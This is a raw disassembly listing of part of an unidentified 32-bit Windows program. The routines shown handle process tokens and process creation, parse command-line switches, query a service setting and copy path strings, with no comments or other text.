  405fd0:	56                   	push   %esi
  405fd1:	ff 15 44 81 40 00    	call   *0x408144
  405fd7:	8b 46 1c             	mov    0x1c(%esi),%eax
  405fda:	33 ed                	xor    %ebp,%ebp
  405fdc:	83 cf ff             	or     $0xffffffff,%edi
  405fdf:	3b c5                	cmp    %ebp,%eax
  405fe1:	74 34                	je     0x406017
  405fe3:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  405fe7:	51                   	push   %ecx
  405fe8:	50                   	push   %eax
  405fe9:	ff 15 38 81 40 00    	call   *0x408138
  405fef:	8b 56 18             	mov    0x18(%esi),%edx
  405ff2:	52                   	push   %edx
  405ff3:	ff 15 48 81 40 00    	call   *0x408148
  405ff9:	81 7c 24 2c 03 01 00 	cmpl   $0x103,0x2c(%esp)
  406000:	00 
  406001:	75 0b                	jne    0x40600e
  406003:	8b 46 1c             	mov    0x1c(%esi),%eax
  406006:	57                   	push   %edi
  406007:	50                   	push   %eax
  406008:	ff 15 30 81 40 00    	call   *0x408130
  40600e:	89 6e 1c             	mov    %ebp,0x1c(%esi)
  406011:	89 6e 18             	mov    %ebp,0x18(%esi)
  406014:	89 6e 20             	mov    %ebp,0x20(%esi)
  406017:	56                   	push   %esi
  406018:	ff 15 3c 81 40 00    	call   *0x40813c
  40601e:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  406022:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  406026:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  40602a:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40602e:	32 db                	xor    %bl,%bl
  406030:	ff 15 a0 80 40 00    	call   *0x4080a0
  406036:	50                   	push   %eax
  406037:	68 30 92 41 00       	push   $0x419230
  40603c:	8d 8c 24 90 00 00 00 	lea    0x90(%esp),%ecx
  406043:	68 f0 81 40 00       	push   $0x4081f0
  406048:	51                   	push   %ecx
  406049:	ff 15 88 81 40 00    	call   *0x408188
  40604f:	a1 74 b2 41 00       	mov    0x41b274,%eax
  406054:	50                   	push   %eax
  406055:	8d 94 24 9c 00 00 00 	lea    0x9c(%esp),%edx
  40605c:	52                   	push   %edx
  40605d:	e8 6e 05 00 00       	call   0x4065d0
  406062:	83 c4 18             	add    $0x18,%esp
  406065:	50                   	push   %eax
  406066:	55                   	push   %ebp
  406067:	68 00 04 00 00       	push   $0x400
  40606c:	ff 15 a4 80 40 00    	call   *0x4080a4
  406072:	8b f0                	mov    %eax,%esi
  406074:	3b f5                	cmp    %ebp,%esi
  406076:	0f 84 4e 01 00 00    	je     0x4061ca
  40607c:	8d 44 24 14          	lea    0x14(%esp),%eax
  406080:	50                   	push   %eax
  406081:	68 00 00 00 02       	push   $0x2000000
  406086:	56                   	push   %esi
  406087:	ff 15 14 80 40 00    	call   *0x408014
  40608d:	85 c0                	test   %eax,%eax
  40608f:	0f 84 35 01 00 00    	je     0x4061ca
  406095:	bf 0c 00 00 00       	mov    $0xc,%edi
  40609a:	57                   	push   %edi
  40609b:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40609f:	55                   	push   %ebp
  4060a0:	51                   	push   %ecx
  4060a1:	e8 5a b0 ff ff       	call   0x401100
  4060a6:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4060aa:	83 c4 0c             	add    $0xc,%esp
  4060ad:	8d 54 24 10          	lea    0x10(%esp),%edx
  4060b1:	52                   	push   %edx
  4060b2:	6a 01                	push   $0x1
  4060b4:	6a 02                	push   $0x2
  4060b6:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4060ba:	50                   	push   %eax
  4060bb:	68 00 00 00 02       	push   $0x2000000
  4060c0:	51                   	push   %ecx
  4060c1:	89 7c 24 38          	mov    %edi,0x38(%esp)
  4060c5:	ff 15 10 80 40 00    	call   *0x408010
  4060cb:	85 c0                	test   %eax,%eax
  4060cd:	0f 84 f7 00 00 00    	je     0x4061ca
  4060d3:	57                   	push   %edi
  4060d4:	8d 54 24 24          	lea    0x24(%esp),%edx
  4060d8:	55                   	push   %ebp
  4060d9:	52                   	push   %edx
  4060da:	e8 21 b0 ff ff       	call   0x401100
  4060df:	83 c4 0c             	add    $0xc,%esp
  4060e2:	55                   	push   %ebp
  4060e3:	8d 44 24 24          	lea    0x24(%esp),%eax
  4060e7:	50                   	push   %eax
  4060e8:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4060ec:	51                   	push   %ecx
  4060ed:	8d 54 24 28          	lea    0x28(%esp),%edx
  4060f1:	52                   	push   %edx
  4060f2:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4060f6:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  4060fd:	00 
  4060fe:	ff 15 c0 80 40 00    	call   *0x4080c0
  406104:	85 c0                	test   %eax,%eax
  406106:	0f 84 be 00 00 00    	je     0x4061ca
  40610c:	6a 10                	push   $0x10
  40610e:	8d 44 24 34          	lea    0x34(%esp),%eax
  406112:	55                   	push   %ebp
  406113:	50                   	push   %eax
  406114:	e8 e7 af ff ff       	call   0x401100
  406119:	6a 44                	push   $0x44
  40611b:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  40611f:	55                   	push   %ebp
  406120:	51                   	push   %ecx
  406121:	e8 da af ff ff       	call   0x401100
  406126:	8b 44 24 30          	mov    0x30(%esp),%eax
  40612a:	83 c4 18             	add    $0x18,%esp
  40612d:	8d 54 24 30          	lea    0x30(%esp),%edx
  406131:	52                   	push   %edx
  406132:	8b 54 24 14          	mov    0x14(%esp),%edx
  406136:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  40613d:	89 84 24 80 00 00 00 	mov    %eax,0x80(%esp)
  406144:	8d 44 24 44          	lea    0x44(%esp),%eax
  406148:	50                   	push   %eax
  406149:	55                   	push   %ebp
  40614a:	55                   	push   %ebp
  40614b:	55                   	push   %ebp
  40614c:	8d 8c 24 9c 00 00 00 	lea    0x9c(%esp),%ecx
  406153:	51                   	push   %ecx
  406154:	55                   	push   %ebp
  406155:	55                   	push   %ebp
  406156:	52                   	push   %edx
  406157:	c7 44 24 64 44 00 00 	movl   $0x44,0x64(%esp)
  40615e:	00 
  40615f:	c7 84 24 90 00 00 00 	movl   $0x100,0x90(%esp)
  406166:	00 01 00 00 
  40616a:	ff 15 48 b2 41 00    	call   *0x41b248
  406170:	85 c0                	test   %eax,%eax
  406172:	0f 95 c3             	setne  %bl
  406175:	84 db                	test   %bl,%bl
  406177:	74 3a                	je     0x4061b3
  406179:	8b 44 24 30          	mov    0x30(%esp),%eax
  40617d:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  406181:	8b 54 24 38          	mov    0x38(%esp),%edx
  406185:	50                   	push   %eax
  406186:	51                   	push   %ecx
  406187:	52                   	push   %edx
  406188:	e8 43 04 00 00       	call   0x4065d0
  40618d:	8b 44 24 44          	mov    0x44(%esp),%eax
  406191:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  406195:	8b 54 24 28          	mov    0x28(%esp),%edx
  406199:	83 c4 0c             	add    $0xc,%esp
  40619c:	50                   	push   %eax
  40619d:	51                   	push   %ecx
  40619e:	52                   	push   %edx
  40619f:	e8 bc ae ff ff       	call   0x401060
  4061a4:	8b 44 24 34          	mov    0x34(%esp),%eax
  4061a8:	8b 3d 48 81 40 00    	mov    0x408148,%edi
  4061ae:	50                   	push   %eax
  4061af:	ff d7                	call   *%edi
  4061b1:	eb 1d                	jmp    0x4061d0
  4061b3:	ff 15 04 81 40 00    	call   *0x408104
  4061b9:	50                   	push   %eax
  4061ba:	8d 8c 24 8c 00 00 00 	lea    0x8c(%esp),%ecx
  4061c1:	51                   	push   %ecx
  4061c2:	e8 09 04 00 00       	call   0x4065d0
  4061c7:	83 c4 08             	add    $0x8,%esp
  4061ca:	8b 3d 48 81 40 00    	mov    0x408148,%edi
  4061d0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4061d4:	3b c5                	cmp    %ebp,%eax
  4061d6:	74 03                	je     0x4061db
  4061d8:	50                   	push   %eax
  4061d9:	ff d7                	call   *%edi
  4061db:	8b 44 24 14          	mov    0x14(%esp),%eax
  4061df:	3b c5                	cmp    %ebp,%eax
  4061e1:	74 03                	je     0x4061e6
  4061e3:	50                   	push   %eax
  4061e4:	ff d7                	call   *%edi
  4061e6:	3b f5                	cmp    %ebp,%esi
  4061e8:	74 03                	je     0x4061ed
  4061ea:	56                   	push   %esi
  4061eb:	ff d7                	call   *%edi
  4061ed:	5f                   	pop    %edi
  4061ee:	5e                   	pop    %esi
  4061ef:	5d                   	pop    %ebp
  4061f0:	8a c3                	mov    %bl,%al
  4061f2:	5b                   	pop    %ebx
  4061f3:	81 c4 7c 08 00 00    	add    $0x87c,%esp
  4061f9:	c3                   	ret
  4061fa:	cc                   	int3
  4061fb:	cc                   	int3
  4061fc:	cc                   	int3
  4061fd:	cc                   	int3
  4061fe:	cc                   	int3
  4061ff:	cc                   	int3
  406200:	a1 a4 b2 41 00       	mov    0x41b2a4,%eax
  406205:	83 ec 08             	sub    $0x8,%esp
  406208:	85 c0                	test   %eax,%eax
  40620a:	53                   	push   %ebx
  40620b:	75 0b                	jne    0x406218
  40620d:	ff 15 94 80 40 00    	call   *0x408094
  406213:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  406218:	3c 06                	cmp    $0x6,%al
  40621a:	73 07                	jae    0x406223
  40621c:	32 c0                	xor    %al,%al
  40621e:	5b                   	pop    %ebx
  40621f:	83 c4 08             	add    $0x8,%esp
  406222:	c3                   	ret
  406223:	80 3d 0b 90 40 00 00 	cmpb   $0x0,0x40900b
  40622a:	74 f0                	je     0x40621c
  40622c:	8d 44 24 08          	lea    0x8(%esp),%eax
  406230:	50                   	push   %eax
  406231:	ff 15 54 b2 41 00    	call   *0x41b254
  406237:	e8 84 fd ff ff       	call   0x405fc0
  40623c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406240:	51                   	push   %ecx
  406241:	8a d8                	mov    %al,%bl
  406243:	ff 15 60 b2 41 00    	call   *0x41b260
  406249:	8a c3                	mov    %bl,%al
  40624b:	5b                   	pop    %ebx
  40624c:	83 c4 08             	add    $0x8,%esp
  40624f:	c3                   	ret
  406250:	83 ec 10             	sub    $0x10,%esp
  406253:	53                   	push   %ebx
  406254:	8d 44 24 10          	lea    0x10(%esp),%eax
  406258:	33 db                	xor    %ebx,%ebx
  40625a:	50                   	push   %eax
  40625b:	89 1d 40 b2 41 00    	mov    %ebx,0x41b240
  406261:	88 5c 24 0b          	mov    %bl,0xb(%esp)
  406265:	ff 15 c8 80 40 00    	call   *0x4080c8
  40626b:	50                   	push   %eax
  40626c:	ff 15 74 81 40 00    	call   *0x408174
  406272:	3b c3                	cmp    %ebx,%eax
  406274:	89 44 24 08          	mov    %eax,0x8(%esp)
  406278:	75 07                	jne    0x406281
  40627a:	32 c0                	xor    %al,%al
  40627c:	5b                   	pop    %ebx
  40627d:	83 c4 10             	add    $0x10,%esp
  406280:	c3                   	ret
  406281:	57                   	push   %edi
  406282:	bf 01 00 00 00       	mov    $0x1,%edi
  406287:	39 7c 24 14          	cmp    %edi,0x14(%esp)
  40628b:	89 7c 24 10          	mov    %edi,0x10(%esp)
  40628f:	0f 8e 7a 01 00 00    	jle    0x40640f
  406295:	55                   	push   %ebp
  406296:	8b 2d 40 b2 41 00    	mov    0x41b240,%ebp
  40629c:	56                   	push   %esi
  40629d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4062a0:	8b 34 b8             	mov    (%eax,%edi,4),%esi
  4062a3:	66 83 3e 6e          	cmpw   $0x6e,(%esi)
  4062a7:	75 22                	jne    0x4062cb
  4062a9:	66 83 7e 02 6f       	cmpw   $0x6f,0x2(%esi)
  4062ae:	75 1b                	jne    0x4062cb
  4062b0:	8d 56 04             	lea    0x4(%esi),%edx
  4062b3:	e8 d8 0d 00 00       	call   0x407090
  4062b8:	84 c0                	test   %al,%al
  4062ba:	0f 84 34 01 00 00    	je     0x4063f4
  4062c0:	88 1d 0b 90 40 00    	mov    %bl,0x40900b
  4062c6:	e9 29 01 00 00       	jmp    0x4063f4
  4062cb:	3b eb                	cmp    %ebx,%ebp
  4062cd:	0f 85 8c 00 00 00    	jne    0x40635f
  4062d3:	8b d6                	mov    %esi,%edx
  4062d5:	e8 d6 0d 00 00       	call   0x4070b0
  4062da:	84 c0                	test   %al,%al
  4062dc:	0f 84 7d 00 00 00    	je     0x40635f
  4062e2:	8d 4e 0a             	lea    0xa(%esi),%ecx
  4062e5:	8b c1                	mov    %ecx,%eax
  4062e7:	66 8b 10             	mov    (%eax),%dx
  4062ea:	83 c0 02             	add    $0x2,%eax
  4062ed:	66 85 d2             	test   %dx,%dx
  4062f0:	75 f5                	jne    0x4062e7
  4062f2:	2b c1                	sub    %ecx,%eax
  4062f4:	d1 f8                	sar    $1,%eax
  4062f6:	03 c0                	add    %eax,%eax
  4062f8:	0f 84 22 01 00 00    	je     0x406420
  4062fe:	50                   	push   %eax
  4062ff:	53                   	push   %ebx
  406300:	ff 15 90 80 40 00    	call   *0x408090
  406306:	50                   	push   %eax
  406307:	ff 15 84 80 40 00    	call   *0x408084
  40630d:	8b e8                	mov    %eax,%ebp
  40630f:	3b eb                	cmp    %ebx,%ebp
  406311:	89 2d 40 b2 41 00    	mov    %ebp,0x41b240
  406317:	74 46                	je     0x40635f
  406319:	8b 44 24 14          	mov    0x14(%esp),%eax
  40631d:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  406320:	8d 70 0a             	lea    0xa(%eax),%esi
  406323:	8b c6                	mov    %esi,%eax
  406325:	66 8b 08             	mov    (%eax),%cx
  406328:	83 c0 02             	add    $0x2,%eax
  40632b:	66 85 c9             	test   %cx,%cx
  40632e:	75 f5                	jne    0x406325
  406330:	2b c6                	sub    %esi,%eax
  406332:	d1 f8                	sar    $1,%eax
  406334:	8b d5                	mov    %ebp,%edx
  406336:	8b f8                	mov    %eax,%edi
  406338:	eb 06                	jmp    0x406340
  40633a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  406340:	0f b7 0e             	movzwl (%esi),%ecx
  406343:	66 89 0a             	mov    %cx,(%edx)
  406346:	83 c2 02             	add    $0x2,%edx
  406349:	83 c6 02             	add    $0x2,%esi
  40634c:	66 3b cb             	cmp    %bx,%cx
  40634f:	74 05                	je     0x406356
  406351:	83 ef 01             	sub    $0x1,%edi
  406354:	75 ea                	jne    0x406340
  406356:	3b fb                	cmp    %ebx,%edi
  406358:	75 05                	jne    0x40635f
  40635a:	66 89 5c 45 fe       	mov    %bx,-0x2(%ebp,%eax,2)
  40635f:	8b 54 24 14          	mov    0x14(%esp),%edx
  406363:	8b 44 24 18          	mov    0x18(%esp),%eax
  406367:	8b 34 82             	mov    (%edx,%eax,4),%esi
  40636a:	0f b7 3e             	movzwl (%esi),%edi
  40636d:	66 83 ff 66          	cmp    $0x66,%di
  406371:	75 0c                	jne    0x40637f
  406373:	66 39 5e 02          	cmp    %bx,0x2(%esi)
  406377:	75 06                	jne    0x40637f
  406379:	88 1d 08 90 40 00    	mov    %bl,0x409008
  40637f:	66 83 ff 76          	cmp    $0x76,%di
  406383:	75 0c                	jne    0x406391
  406385:	66 39 5e 02          	cmp    %bx,0x2(%esi)
  406389:	75 06                	jne    0x406391
  40638b:	88 1d 0e 90 41 00    	mov    %bl,0x41900e
  406391:	66 83 ff 64          	cmp    $0x64,%di
  406395:	75 0c                	jne    0x4063a3
  406397:	66 39 5e 02          	cmp    %bx,0x2(%esi)
  40639b:	75 06                	jne    0x4063a3
  40639d:	88 1d 09 90 40 00    	mov    %bl,0x409009
  4063a3:	66 83 ff 6e          	cmp    $0x6e,%di
  4063a7:	75 3a                	jne    0x4063e3
  4063a9:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  4063ad:	8d 56 02             	lea    0x2(%esi),%edx
  4063b0:	33 c9                	xor    %ecx,%ecx
  4063b2:	66 3b c3             	cmp    %bx,%ax
  4063b5:	74 21                	je     0x4063d8
  4063b7:	66 3d 30 00          	cmp    $0x30,%ax
  4063bb:	72 1b                	jb     0x4063d8
  4063bd:	66 3d 39 00          	cmp    $0x39,%ax
  4063c1:	77 15                	ja     0x4063d8
  4063c3:	0f b7 c0             	movzwl %ax,%eax
  4063c6:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  4063c9:	83 c2 02             	add    $0x2,%edx
  4063cc:	8d 4c 48 d0          	lea    -0x30(%eax,%ecx,2),%ecx
  4063d0:	0f b7 02             	movzwl (%edx),%eax
  4063d3:	66 3b c3             	cmp    %bx,%ax
  4063d6:	75 df                	jne    0x4063b7
  4063d8:	89 0d 1c 90 41 00    	mov    %ecx,0x41901c
  4063de:	c6 44 24 13 02       	movb   $0x2,0x13(%esp)
  4063e3:	66 83 ff 65          	cmp    $0x65,%di
  4063e7:	75 0b                	jne    0x4063f4
  4063e9:	66 39 5e 02          	cmp    %bx,0x2(%esi)
  4063ed:	75 05                	jne    0x4063f4
  4063ef:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  4063f4:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4063f8:	8b 44 24 14          	mov    0x14(%esp),%eax
  4063fc:	83 c7 01             	add    $0x1,%edi
  4063ff:	3b 7c 24 1c          	cmp    0x1c(%esp),%edi
  406403:	89 7c 24 18          	mov    %edi,0x18(%esp)
  406407:	0f 8c 93 fe ff ff    	jl     0x4062a0
  40640d:	5e                   	pop    %esi
  40640e:	5d                   	pop    %ebp
  40640f:	50                   	push   %eax
  406410:	ff 15 c4 80 40 00    	call   *0x4080c4
  406416:	8a 44 24 0b          	mov    0xb(%esp),%al
  40641a:	5f                   	pop    %edi
  40641b:	5b                   	pop    %ebx
  40641c:	83 c4 10             	add    $0x10,%esp
  40641f:	c3                   	ret
  406420:	33 ed                	xor    %ebp,%ebp
  406422:	89 2d 40 b2 41 00    	mov    %ebp,0x41b240
  406428:	e9 32 ff ff ff       	jmp    0x40635f
  40642d:	cc                   	int3
  40642e:	cc                   	int3
  40642f:	cc                   	int3
  406430:	81 ec 6c 02 00 00    	sub    $0x26c,%esp
  406436:	80 3d 09 90 40 00 00 	cmpb   $0x0,0x409009
  40643d:	53                   	push   %ebx
  40643e:	55                   	push   %ebp
  40643f:	56                   	push   %esi
  406440:	57                   	push   %edi
  406441:	0f 84 70 01 00 00    	je     0x4065b7
  406447:	e8 84 01 00 00       	call   0x4065d0
  40644c:	8d 44 24 14          	lea    0x14(%esp),%eax
  406450:	50                   	push   %eax
  406451:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406456:	6a 17                	push   $0x17
  406458:	e8 f3 c4 ff ff       	call   0x402950
  40645d:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  406461:	51                   	push   %ecx
  406462:	8b e8                	mov    %eax,%ebp
  406464:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406469:	6a 38                	push   $0x38
  40646b:	e8 e0 c4 ff ff       	call   0x402950
  406470:	8b f8                	mov    %eax,%edi
  406472:	85 ff                	test   %edi,%edi
  406474:	0f 84 3d 01 00 00    	je     0x4065b7
  40647a:	85 ed                	test   %ebp,%ebp
  40647c:	0f 84 35 01 00 00    	je     0x4065b7
  406482:	68 04 01 00 00       	push   $0x104
  406487:	8d 54 24 74          	lea    0x74(%esp),%edx
  40648b:	52                   	push   %edx
  40648c:	55                   	push   %ebp
  40648d:	ff 15 b8 80 40 00    	call   *0x4080b8
  406493:	85 c0                	test   %eax,%eax
  406495:	0f 84 1c 01 00 00    	je     0x4065b7
  40649b:	8d 54 24 70          	lea    0x70(%esp),%edx
  40649f:	90                   	nop
  4064a0:	66 8b 02             	mov    (%edx),%ax
  4064a3:	83 c2 02             	add    $0x2,%edx
  4064a6:	66 85 c0             	test   %ax,%ax
  4064a9:	75 f5                	jne    0x4064a0
  4064ab:	8b cf                	mov    %edi,%ecx
  4064ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4064b0:	66 8b 01             	mov    (%ecx),%ax
  4064b3:	83 c1 02             	add    $0x2,%ecx
  4064b6:	66 85 c0             	test   %ax,%ax
  4064b9:	75 f5                	jne    0x4064b0
  4064bb:	b8 30 92 41 00       	mov    $0x419230,%eax
  4064c0:	66 8b 30             	mov    (%eax),%si
  4064c3:	83 c0 02             	add    $0x2,%eax
  4064c6:	66 85 f6             	test   %si,%si
  4064c9:	75 f5                	jne    0x4064c0
  4064cb:	2d 30 92 41 00       	sub    $0x419230,%eax
  4064d0:	2b cf                	sub    %edi,%ecx
  4064d2:	d1 f8                	sar    $1,%eax
  4064d4:	d1 f9                	sar    $1,%ecx
  4064d6:	8d 44 41 fe          	lea    -0x2(%ecx,%eax,2),%eax
  4064da:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  4064de:	2b d1                	sub    %ecx,%edx
  4064e0:	d1 fa                	sar    $1,%edx
  4064e2:	03 c2                	add    %edx,%eax
  4064e4:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4064e8:	85 c0                	test   %eax,%eax
  4064ea:	0f 84 c7 00 00 00    	je     0x4065b7
  4064f0:	50                   	push   %eax
  4064f1:	6a 00                	push   $0x0
  4064f3:	ff 15 90 80 40 00    	call   *0x408090
  4064f9:	50                   	push   %eax
  4064fa:	ff 15 84 80 40 00    	call   *0x408084
  406500:	8b f0                	mov    %eax,%esi
  406502:	85 f6                	test   %esi,%esi
  406504:	0f 84 ad 00 00 00    	je     0x4065b7
  40650a:	68 30 92 41 00       	push   $0x419230
  40650f:	68 30 92 41 00       	push   $0x419230
  406514:	8d 54 24 78          	lea    0x78(%esp),%edx
  406518:	52                   	push   %edx
  406519:	57                   	push   %edi
  40651a:	56                   	push   %esi
  40651b:	ff 15 88 81 40 00    	call   *0x408188
  406521:	83 c4 14             	add    $0x14,%esp
  406524:	6a 44                	push   $0x44
  406526:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40652a:	6a 00                	push   $0x0
  40652c:	50                   	push   %eax
  40652d:	e8 ce ab ff ff       	call   0x401100
  406532:	83 c4 0c             	add    $0xc,%esp
  406535:	6a 10                	push   $0x10
  406537:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40653b:	6a 00                	push   $0x0
  40653d:	51                   	push   %ecx
  40653e:	e8 bd ab ff ff       	call   0x401100
  406543:	83 c4 0c             	add    $0xc,%esp
  406546:	8d 54 24 18          	lea    0x18(%esp),%edx
  40654a:	52                   	push   %edx
  40654b:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40654f:	50                   	push   %eax
  406550:	6a 00                	push   $0x0
  406552:	6a 00                	push   $0x0
  406554:	68 00 00 00 08       	push   $0x8000000
  406559:	6a 00                	push   $0x0
  40655b:	6a 00                	push   $0x0
  40655d:	6a 00                	push   $0x0
  40655f:	56                   	push   %esi
  406560:	6a 00                	push   $0x0
  406562:	c7 44 24 50 44 00 00 	movl   $0x44,0x50(%esp)
  406569:	00 
  40656a:	ff 15 bc 80 40 00    	call   *0x4080bc
  406570:	85 c0                	test   %eax,%eax
  406572:	75 1a                	jne    0x40658e
  406574:	ff 15 04 81 40 00    	call   *0x408104
  40657a:	50                   	push   %eax
  40657b:	e8 50 00 00 00       	call   0x4065d0
  406580:	83 c4 04             	add    $0x4,%esp
  406583:	5f                   	pop    %edi
  406584:	5e                   	pop    %esi
  406585:	5d                   	pop    %ebp
  406586:	5b                   	pop    %ebx
  406587:	81 c4 6c 02 00 00    	add    $0x26c,%esp
  40658d:	c3                   	ret
  40658e:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  406592:	8b 1d 48 81 40 00    	mov    0x408148,%ebx
  406598:	51                   	push   %ecx
  406599:	ff d3                	call   *%ebx
  40659b:	8b 54 24 18          	mov    0x18(%esp),%edx
  40659f:	52                   	push   %edx
  4065a0:	ff d3                	call   *%ebx
  4065a2:	8b c5                	mov    %ebp,%eax
  4065a4:	e8 a7 dc ff ff       	call   0x404250
  4065a9:	8b c7                	mov    %edi,%eax
  4065ab:	e8 a0 dc ff ff       	call   0x404250
  4065b0:	8b c6                	mov    %esi,%eax
  4065b2:	e8 99 dc ff ff       	call   0x404250
  4065b7:	5f                   	pop    %edi
  4065b8:	5e                   	pop    %esi
  4065b9:	5d                   	pop    %ebp
  4065ba:	5b                   	pop    %ebx
  4065bb:	81 c4 6c 02 00 00    	add    $0x26c,%esp
  4065c1:	c3                   	ret
  4065c2:	cc                   	int3
  4065c3:	cc                   	int3
  4065c4:	cc                   	int3
  4065c5:	cc                   	int3
  4065c6:	cc                   	int3
  4065c7:	cc                   	int3
  4065c8:	cc                   	int3
  4065c9:	cc                   	int3
  4065ca:	cc                   	int3
  4065cb:	cc                   	int3
  4065cc:	cc                   	int3
  4065cd:	cc                   	int3
  4065ce:	cc                   	int3
  4065cf:	cc                   	int3
  4065d0:	c3                   	ret
  4065d1:	cc                   	int3
  4065d2:	cc                   	int3
  4065d3:	cc                   	int3
  4065d4:	cc                   	int3
  4065d5:	cc                   	int3
  4065d6:	cc                   	int3
  4065d7:	cc                   	int3
  4065d8:	cc                   	int3
  4065d9:	cc                   	int3
  4065da:	cc                   	int3
  4065db:	cc                   	int3
  4065dc:	cc                   	int3
  4065dd:	cc                   	int3
  4065de:	cc                   	int3
  4065df:	cc                   	int3
  4065e0:	a1 a4 b2 41 00       	mov    0x41b2a4,%eax
  4065e5:	83 ec 0c             	sub    $0xc,%esp
  4065e8:	85 c0                	test   %eax,%eax
  4065ea:	75 0b                	jne    0x4065f7
  4065ec:	ff 15 94 80 40 00    	call   *0x408094
  4065f2:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  4065f7:	3c 06                	cmp    $0x6,%al
  4065f9:	73 10                	jae    0x40660b
  4065fb:	ff 15 70 81 40 00    	call   *0x408170
  406601:	f7 d8                	neg    %eax
  406603:	1b c0                	sbb    %eax,%eax
  406605:	f7 d8                	neg    %eax
  406607:	83 c4 0c             	add    $0xc,%esp
  40660a:	c3                   	ret
  40660b:	8d 04 24             	lea    (%esp),%eax
  40660e:	50                   	push   %eax
  40660f:	68 ff 01 0f 00       	push   $0xf01ff
  406614:	ff 15 88 80 40 00    	call   *0x408088
  40661a:	50                   	push   %eax
  40661b:	ff 15 14 80 40 00    	call   *0x408014
  406621:	85 c0                	test   %eax,%eax
  406623:	75 06                	jne    0x40662b
  406625:	32 c0                	xor    %al,%al
  406627:	83 c4 0c             	add    $0xc,%esp
  40662a:	c3                   	ret
  40662b:	8b 04 24             	mov    (%esp),%eax
  40662e:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  406632:	51                   	push   %ecx
  406633:	6a 04                	push   $0x4
  406635:	8d 54 24 0c          	lea    0xc(%esp),%edx
  406639:	52                   	push   %edx
  40663a:	6a 14                	push   $0x14
  40663c:	50                   	push   %eax
  40663d:	ff 15 1c 80 40 00    	call   *0x40801c
  406643:	8b 0c 24             	mov    (%esp),%ecx
  406646:	51                   	push   %ecx
  406647:	ff 15 48 81 40 00    	call   *0x408148
  40664d:	33 c0                	xor    %eax,%eax
  40664f:	39 44 24 04          	cmp    %eax,0x4(%esp)
  406653:	0f 95 c0             	setne  %al
  406656:	83 c4 0c             	add    $0xc,%esp
  406659:	c3                   	ret
  40665a:	cc                   	int3
  40665b:	cc                   	int3
  40665c:	cc                   	int3
  40665d:	cc                   	int3
  40665e:	cc                   	int3
  40665f:	cc                   	int3
  406660:	57                   	push   %edi
  406661:	68 04 01 00 00       	push   $0x104
  406666:	68 28 90 41 00       	push   $0x419028
  40666b:	ff 15 e4 80 40 00    	call   *0x4080e4
  406671:	33 ff                	xor    %edi,%edi
  406673:	85 c0                	test   %eax,%eax
  406675:	75 09                	jne    0x406680
  406677:	66 89 3d 28 90 41 00 	mov    %di,0x419028
  40667e:	eb 2f                	jmp    0x4066af
  406680:	b8 28 90 41 00       	mov    $0x419028,%eax
  406685:	66 8b 08             	mov    (%eax),%cx
  406688:	83 c0 02             	add    $0x2,%eax
  40668b:	66 85 c9             	test   %cx,%cx
  40668e:	75 f5                	jne    0x406685
  406690:	2d 28 90 41 00       	sub    $0x419028,%eax
  406695:	d1 f8                	sar    $1,%eax
  406697:	83 e8 01             	sub    $0x1,%eax
  40669a:	74 13                	je     0x4066af
  40669c:	66 83 3c 45 26 90 41 	cmpw   $0x5c,0x419026(,%eax,2)
  4066a3:	00 5c 
  4066a5:	75 08                	jne    0x4066af
  4066a7:	66 89 3c 45 26 90 41 	mov    %di,0x419026(,%eax,2)
  4066ae:	00 
  4066af:	68 00 04 00 00       	push   $0x400
  4066b4:	68 30 92 41 00       	push   $0x419230
  4066b9:	57                   	push   %edi
  4066ba:	ff 15 dc 80 40 00    	call   *0x4080dc
  4066c0:	85 c0                	test   %eax,%eax
  4066c2:	75 10                	jne    0x4066d4
  4066c4:	66 89 3d 30 9a 41 00 	mov    %di,0x419a30
  4066cb:	66 89 3d 30 92 41 00 	mov    %di,0x419230
  4066d2:	eb 67                	jmp    0x40673b
  4066d4:	ba 00 04 00 00       	mov    $0x400,%edx
  4066d9:	33 c0                	xor    %eax,%eax
  4066db:	eb 03                	jmp    0x4066e0
  4066dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4066e0:	0f b7 88 30 92 41 00 	movzwl 0x419230(%eax),%ecx
  4066e7:	66 89 88 30 9a 41 00 	mov    %cx,0x419a30(%eax)
  4066ee:	83 c0 02             	add    $0x2,%eax
  4066f1:	66 3b cf             	cmp    %di,%cx
  4066f4:	74 05                	je     0x4066fb
  4066f6:	83 ea 01             	sub    $0x1,%edx
  4066f9:	75 e5                	jne    0x4066e0
  4066fb:	3b d7                	cmp    %edi,%edx
  4066fd:	75 07                	jne    0x406706
  4066ff:	66 89 3d 2e a2 41 00 	mov    %di,0x41a22e
